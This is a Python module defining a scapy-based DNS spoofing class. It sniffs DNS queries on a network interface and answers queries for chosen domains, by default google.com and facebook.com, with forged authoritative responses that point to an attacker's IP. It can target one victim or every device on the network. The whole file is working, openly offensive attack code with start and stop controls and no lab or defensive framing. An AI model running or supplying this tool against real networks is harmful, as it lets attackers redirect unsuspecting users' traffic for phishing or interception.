"""
DNS Spoofing Module
Sends fake DNS responses to redirect domains to attacker's IP
Inspired by CyberWatch DNS detector pattern
"""

import sys
import threading
import time
from pathlib import Path
from typing import Optional, List
from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, Ether

sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger
from utils.network_utils import get_mac, get_local_ip


class DNSSpoofer:
    """
    Performs DNS spoofing attacks by intercepting DNS queries
    and responding with fake answers redirecting to attacker's IP.
    
    Usage:
        spoofer = DNSSpoofer(
            attacker_ip="192.168.1.100",
            target_domains=["google.com", "facebook.com"],
            interface="eth0"
        )
        spoofer.start_attack()
        # ... attack runs in background ...
        spoofer.stop_attack()
    """
    
    def __init__(
        self,
        attacker_ip: str,
        target_domains: Optional[List[str]] = None,
        interface: Optional[str] = None,
        victim_ip: Optional[str] = None
    ):
        """
        Initialize DNS Spoofer
        
        Args:
            attacker_ip: IP address to redirect victims to (attacker's IP)
            target_domains: List of domains to spoof (e.g., ["google.com", "facebook.com"])
            interface: Network interface to sniff on (e.g., "eth0", "WiFi")
            victim_ip: (Optional) Specific victim IP to target. If None, affects all devices.
        """
        self.attacker_ip = attacker_ip or get_local_ip()
        self.target_domains = set(target_domains or ["google.com", "facebook.com"])
        self.interface = interface
        self.victim_ip = victim_ip  # NEW: Can be None for network-wide or specific IP for targeted
        
        self.logger = get_logger("DNSSpoof")
        self.is_running = False
        self.sniff_thread: Optional[threading.Thread] = None
        self.packets_spoofed = 0
        self.start_time = None
        
        target_str = f"victim={self.victim_ip}" if victim_ip else "network-wide"
        self.logger.info(
            f"Initialized DNSSpoofer: attacker_ip={self.attacker_ip}, "
            f"domains={self.target_domains}, interface={interface}, {target_str}"
        )
    
    def _is_target_domain(self, query_name: str) -> bool:
        """Check if query is for one of our target domains"""
        query_name = query_name.lower().rstrip('.')
        for domain in self.target_domains:
            domain = domain.lower().rstrip('.')
            # Match exact domain or subdomains
            if query_name == domain or query_name.endswith(f'.{domain}'):
                return True
        return False
    
    def _create_fake_dns_response(self, packet, query_name: str):
        """
        Create a fake DNS response packet
        
        Args:
            packet: Original DNS query packet
            query_name: Domain name from query
        
        Returns:
            Crafted DNS response packet
        """
        try:
            # Extract original query info
            ip_layer = packet[IP]
            udp_layer = packet[UDP]
            dns_layer = packet[DNS]
            
            # Build response: swap source/destination
            response = (
                Ether(dst=packet[Ether].src, src=packet[Ether].dst) /
                IP(dst=ip_layer.src, src=self.attacker_ip) /
                UDP(dport=udp_layer.sport, sport=53) /
                DNS(
                    id=dns_layer.id,
                    qr=1,  # Response
                    aa=1,  # Authoritative answer
                    rd=0,
                    ra=0,
                    z=0,
                    rcode=0,  # No error
                    qdcount=1,
                    ancount=1,
                    nscount=0,
                    arcount=0,
                    qd=DNSQR(qname=query_name),
                    an=DNSRR(
                        rrname=query_name,
                        type=1,  # A record
                        rclass=1,  # IN
                        ttl=10,  # Short TTL
                        rdata=self.attacker_ip
                    )
                )
            )
            return response
        except Exception as e:
            self.logger.error(f"Error creating fake DNS response: {e}")
            return None
    
    def _packet_callback(self, packet):
        """Callback for each sniffed DNS packet"""
        try:
            # Check if it's a DNS query
            if not packet.haslayer(DNS):
                return
            
            # If victim_ip is specified, only respond to queries from that victim
            if self.victim_ip:
                if not packet.haslayer(IP):
                    return
                source_ip = packet[IP].src
                if source_ip != self.victim_ip:
                    return  # Ignore queries from other IPs
            
            dns_layer = packet[DNS]
            
            # Only process queries (not responses)
            if dns_layer.qr == 0:  # Query
                # Extract domain name
                if dns_layer.qd:
                    query_name = dns_layer.qd.qname.decode('utf-8')
                    
                    # Check if it's one of our target domains
                    if self._is_target_domain(query_name):
                        victim_info = f"from {self.victim_ip}" if self.victim_ip else "from network"
                        self.logger.info(f"🎯 Intercepted DNS query {victim_info} for {query_name}")
                        
                        # Create and send fake response
                        fake_response = self._create_fake_dns_response(packet, query_name)
                        if fake_response:
                            from scapy.all import send
                            send(fake_response, verbose=False, iface=self.interface)
                            self.packets_spoofed += 1
                            self.logger.info(f"✅ Sent fake DNS response: {query_name} → {self.attacker_ip}")
        
        except Exception as e:
            self.logger.error(f"Error in packet callback: {e}")
    
    def start_attack(self):
        """Start DNS spoofing attack"""
        if self.is_running:
            self.logger.warning("Attack already running")
            return False
        
        self.is_running = True
        self.packets_spoofed = 0
        self.start_time = time.time()
        
        # Start sniffing in background thread
        self.sniff_thread = threading.Thread(
            target=self._sniff_loop,
            daemon=True,
            name="DNSSpoof-Sniff"
        )
        self.sniff_thread.start()
        
        self.logger.info(f"🚀 DNS Spoofing attack started")
        return True
    
    def _sniff_loop(self):
        """Sniff DNS packets in loop"""
        try:
            self.logger.info(f"Starting DNS sniffer on interface {self.interface} for port 53")
            sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self._packet_callback,
                store=False,
                stop_filter=lambda _: not self.is_running,
                timeout=None
            )
        except Exception as e:
            self.logger.error(f"Sniff error: {e}")
            self.logger.info("Trying fallback: sniffing all UDP packets on port 53")
            try:
                sniff(
                    iface=self.interface,
                    filter="udp and (port 53 or src port 53 or dst port 53)",
                    prn=self._packet_callback,
                    store=False,
                    stop_filter=lambda _: not self.is_running,
                    timeout=None
                )
            except Exception as e2:
                self.logger.error(f"Fallback sniff also failed: {e2}")
        finally:
            self.logger.info("DNS spoof sniff loop stopped")
    
    def stop_attack(self):
        """Stop DNS spoofing attack"""
        if not self.is_running:
            self.logger.warning("Attack not running")
            return False
        
        self.is_running = False
        
        # Wait for thread to finish
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join(timeout=2)
        
        # Log statistics
        duration = time.time() - self.start_time if self.start_time else 0
        self.logger.info(
            f"🛑 DNS Spoofing attack stopped | "
            f"Duration: {duration:.1f}s | "
            f"Packets spoofed: {self.packets_spoofed}"
        )
        
        return True
    
    def get_status(self) -> dict:
        """Get attack status"""
        return {
            "is_running": self.is_running,
            "attacker_ip": self.attacker_ip,
            "target_domains": list(self.target_domains),
            "packets_spoofed": self.packets_spoofed,
            "start_time": self.start_time,
        }
